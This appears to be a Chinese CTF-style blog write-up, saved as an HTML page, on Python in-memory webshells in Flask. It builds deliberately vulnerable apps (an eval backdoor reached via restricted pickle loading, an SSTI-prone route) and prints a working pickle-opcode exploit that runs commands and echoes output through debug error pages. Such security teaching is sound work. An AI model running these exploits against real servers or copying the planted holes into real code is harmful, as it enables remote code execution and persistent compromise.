@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01前置知识什么是内存马？其实内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，相比于以往的传统文件上传webshell来说内存马的检测难度更大 什么是python内存马？Python 内存马利用Flask框架中SSTI注入来实现, Flask框架中在web应用模板渲染的过程中用到render_template_string进行渲染, 但未对用户传输的代码进行过滤导致用户可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一些python内存马的学习">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="0x01前置知识什么是内存马？其实内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，相比于以往的传统文件上传webshell来说内存马的检测难度更大 什么是python内存马？Python 内存马利用Flask框架中SSTI注入来实现, Flask框架中在web应用模板渲染的过程中用到render_template_string进行渲染, 但未对用户传输的代码进行过滤导致用户可以">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609132422946.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134240706.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609140546272.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134451361.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609134557790.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609135108942.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609141032945.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609141344088.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609141926329.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609142028036.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609142124488.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/3181170-20240509130942991-1709772057.png">
+<meta property="article:published_time" content="2025-06-09T02:22:51.000Z">
+<meta property="article:modified_time" content="2025-08-07T07:50:08.503Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="python内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609132422946.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>一些python内存马的学习</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/06/09/OpenHarmonyCTF2025/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&text=一些python内存马的学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&is_video=false&description=一些python内存马的学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一些python内存马的学习&body=Check out this article: https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&title=一些python内存马的学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&name=一些python内存马的学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/06/09/%E4%B8%80%E4%BA%9Bpython%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AD%A6%E4%B9%A0/&t=一些python内存马的学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">0x01前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是内存马？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpython%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">什么是python内存马？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E6%97%A7%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text">0x02旧版Flask下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E9%A2%98%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.</span> <span class="toc-text">赛题环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.</span> <span class="toc-text">debug模式下的报错回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.4.</span> <span class="toc-text">路由注入的内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E6%96%B0%E7%89%88Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">0x03新版Flask下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8before-request%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">使用before_request方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-after-request%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">使用 after_request方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%E5%9B%9E%E9%A1%BE%E8%B5%9B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">0x04回顾赛题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05sanic%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">5.</span> <span class="toc-text">0x05sanic下的内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%85%A5"><span class="toc-number">5.1.</span> <span class="toc-text">路由注入</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        一些python内存马的学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-09T02:22:51.000Z" class="dt-published" itemprop="datePublished">2025-06-09</time>
+        
+        (Updated: <time datetime="2025-08-07T07:50:08.503Z" class="dt-updated" itemprop="dateModified">2025-08-07</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/python%E5%86%85%E5%AD%98%E9%A9%AC/">python内存马</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/python%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">python内存马</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h2><h3 id="什么是内存马？"><a href="#什么是内存马？" class="headerlink" title="什么是内存马？"></a>什么是内存马？</h3><p>其实内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，相比于以往的传统文件上传webshell来说内存马的检测难度更大</p>
+<h3 id="什么是python内存马？"><a href="#什么是python内存马？" class="headerlink" title="什么是python内存马？"></a>什么是python内存马？</h3><p><code>Python 内存马</code>利用<code>Flask</code>框架中<code>SSTI</code>注入来实现, <code>Flask</code>框架中在<code>web</code>应用模板渲染的过程中用到<code>render_template_string</code>进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现<code>Python</code>内存马的注入.</p>
+<h2 id="0x02旧版Flask下的内存马"><a href="#0x02旧版Flask下的内存马" class="headerlink" title="0x02旧版Flask下的内存马"></a>0x02旧版Flask下的内存马</h2><p>为什么要说是旧版呢？这源于我在看一篇关于<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18181936">FLASK下python内存马</a>的研究的文章的时候发现21年的flask2.x和新版的flask3.x的内存马攻击姿势是不一样的，具体如何我们一步步跟着走就知道了</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">flask不出网回显方式</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先就是安装flask2.x版本的框架</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask==2.0.0</span><br></pre></td></tr></table></figure>
+
+<p>成功后我们还需要安装<strong>Werkzeug</strong>，因为我之前是用的3.x，导致跟flask2.x不兼容了，所以得降版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install &quot;werkzeug&gt;=2.0.0,&lt;3.0.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>正常的话直接安装就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install werkzeug==2.0.0</span><br></pre></td></tr></table></figure>
+
+<p>安装好后我们输出一下flask的版本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flask.__version__)</span><br><span class="line"><span class="comment">#2.0.0</span></span><br></pre></td></tr></table></figure>
+
+<p>然后我们测试一下框架</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后运行框架访问5000端口就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask run</span><br></pre></td></tr></table></figure>
+
+<h3 id="赛题环境"><a href="#赛题环境" class="headerlink" title="赛题环境"></a>赛题环境</h3><p>然后我们来搭一个测试环境</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template_string, url_for, redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    info = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.py</span></span><br><span class="line">notadmin = &#123;<span class="string">&quot;admin&quot;</span>: <span class="string">&quot;no&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">if</span> notadmin[<span class="string">&quot;admin&quot;</span>] == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        s = <span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">eval</span>(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<p>这里的话会对传入的name参数进行一个base64解码和pickle反序列化操作，在RestrictedUnpickler函数中只允许从config模块加载该类，并且禁止加载带有下划线的方法</p>
+<p>这道题的话其实一眼就可以看出来了，就是一个pickle反序列化的问题，但是这里的重点并不在于反序列化，而是在于如何利用eval函数去回显，但是赛题的环境靶机是不出网的，所以打不了反弹shell（自己本地搭的不知道怎么设置靶机不出网emmm）那么这时候又该怎么去让我们的命令回显呢？</p>
+<h3 id="debug模式下的报错回显"><a href="#debug模式下的报错回显" class="headerlink" title="debug模式下的报错回显"></a>debug模式下的报错回显</h3><p>在flask中，如果开启了debug模式的话，报错是会显示详细信息的，所以我们尝试手动控制报错语句让我们的命令执行并回显</p>
+<p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">s: <span class="built_in">str</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> b64encode(s.encode()).decode(encoding=encoding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exc = <span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span></span><br><span class="line">exc = base64_encode(exc).encode()</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">(S&#x27;admin&#x27;</span></span><br><span class="line"><span class="string">S&#x27;yes&#x27;</span></span><br><span class="line"><span class="string">u0(cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;exec(__import__(&quot;base64&quot;).b64decode(b&quot;%s&quot;))&#x27;</span></span><br><span class="line"><span class="string">lo.&#x27;&#x27;&#x27;</span> % (exc)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(b64encode(opcode).decode()))</span><br></pre></td></tr></table></figure>
+
+<p>这里的话将 <code>whoami</code> 的结果作为异常消息。</p>
+<p><img src="/../image/achieve/202411/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250609132422946.png" alt="image-20250609132422946"></p>
+<p>成功执行命令并回显，但这个并不是我们内存马的内容，下面才是主要的</p>
+<h3 id="路由注入的内存马"><a href="#路由注入的内存马" class="headerlink" title="路由注入的内存马"></a>路由注入的内存马</h3><p>这个的话就暂时不用赛题的环境了，我们自己搭一个测试的环境</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask ,request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Hello, %s!</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>%(name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>之前也说过，python内存马都是在ssti下进行注入的，这里参考了文章<a target="_blank" rel="noopener" href="https://github.com/iceyhexman/flask_memory_shell%EF%BC%8C%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E8%AE%B2%E7%9A%84%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8flask%E5%8E%BB%E6%B7%BB%E5%8A%A0%E6%81%B6%E6%84%8F%E8%B7%AF%E7%94%B1%EF%BC%8C%E4%BD%86%E6%98%AF%E9%97%AE%E9%A2%98%E5%9C%A8%E4%BA%8E%E5%A6%82%E4%BD%95%E6%8B%BF%E5%88%B0%E6%88%91%E4%BB%AC%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84app">https://github.com/iceyhexman/flask_memory_shell，这篇文章讲的是如何利用flask去添加恶意路由，但是问题在于如何拿到我们正在运行的app</a></p>
